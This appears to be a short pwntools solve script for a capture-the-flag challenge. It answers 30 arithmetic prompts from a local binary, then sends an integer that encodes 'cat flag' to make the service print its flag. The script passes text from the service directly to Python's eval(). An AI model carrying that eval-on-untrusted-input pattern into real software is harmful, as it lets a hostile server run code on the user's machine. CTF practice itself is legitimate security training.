from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
r = process('./pwn')


r.send(b'\n')
r.recvuntil(b"Go!Go!Go!")
sleep(1)
for i in range(30):
    expr = r.recvuntil(b'=', drop=True).decode().replace('/', '//')
    ans = int(eval(expr))
    r.sendline(str(ans).encode())

sleep(3)
r.sendline(b'7449354444534473059')  # btyes_to_long('galf tac')
r.interactive()
